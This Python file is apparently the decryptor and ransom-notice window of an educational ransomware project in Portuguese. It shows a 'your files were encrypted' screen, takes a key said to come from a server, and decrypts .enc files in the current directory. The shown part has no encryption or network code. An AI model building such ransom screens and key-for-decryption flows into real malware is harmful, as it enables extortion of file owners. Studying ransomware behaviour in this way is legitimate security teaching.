import ctypes
import subprocess
import tkinter as tk
import threading
import base64
import os
from tkinter import messagebox
from cryptography.fernet import Fernet


files_enc = []
dirs_enc = []

def listdir_enc(path): 
    try:
        for file in os.listdir(path):
            if os.path.isdir(f"{path}{file}"):
                dirs_enc.append(f"{path}{file}/")
            elif file.split(".")[-1] == "enc" and file != "key.bin.enc":
                files_enc.append(f"{path}{file}")
    except PermissionError:
        pass

def decrypt(file, key):
    try:
        fernet = Fernet(key)
        with open(file, "rb") as f:
            enc_data = f.read()

        data = fernet.decrypt(enc_data)

        with open(file.replace(".enc", ""), "wb") as f:
            f.write(data)
        os.remove(file)
    except Exception as e:
        print(f"Erro ao descriptografar {file}: Chave inválida.")

def exibir_aviso_tkinter():
    root = tk.Tk()
    root.title("Aviso e Decriptador - Ransomware Didático")
    root.geometry("800x600")
    root.configure(bg="darkred")
    
    titulo = tk.Label(root, text="SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!", font=("Arial", 24, "bold"), fg="white", bg="darkred")
    titulo.pack(pady=50)
    
    mensagem = tk.Label(root, text="Este é um projeto didático.\nOs seus arquivos locais foram criptografados usando AES e RSA.\nConsulte as instruções do projeto para reverter a ação.", font=("Arial", 16), fg="white", bg="darkred")
    mensagem.pack(pady=20)
    
    tk.Label(root, text="Insira a chave recebida do servidor abaixo para descriptografar:", font=("Arial", 12, "bold"), fg="white", bg="darkred").pack(pady=10)

    entry_key = tk.Entry(root, width=60, font=("Courier", 12))
    entry_key.pack(padx=20, pady=5)

    def iniciar_decriptacao():
        chave_recebida = entry_key.get().strip()
        
        if not chave_recebida:
            messagebox.showwarning("Aviso", "Insira a chave recebida do servidor.")
            return

        try:
            chave_final = base64.b64decode(chave_recebida)
            Fernet(chave_final)
        except Exception:
            messagebox.showerror("Erro", "A chave inserida é inválida ou não está no formato esperado.")
            return

        files_enc.clear()
        dirs_enc.clear()
        listdir_enc("./")

        if len(dirs_enc) > 0:
            threads_dir = []
            for d in dirs_enc:
                t = threading.Thread(target=listdir_enc, args=(d,))
                threads_dir.append(t)
                t.start()
            for t in threads_dir:
                t.join()

        threads_dec = []
        for file in files_enc:
            t = threading.Thread(target=decrypt, args=(file, chave_final))
            threads_dec.append(t)
            t.start()
        
        for t in threads_dec:
            t.join()

        messagebox.showinfo("Sucesso", "Arquivos descriptografados com sucesso!")
        root.destroy() # Fecha a janela ao finalizar com sucesso

    btn = tk.Button(root, text="Descriptografar Arquivos", command=iniciar_decriptacao, 
                    bg="black", fg="white", font=("Arial", 12, "bold"), padx=20, pady=10)
    btn.pack(pady=20)

    root.mainloop()
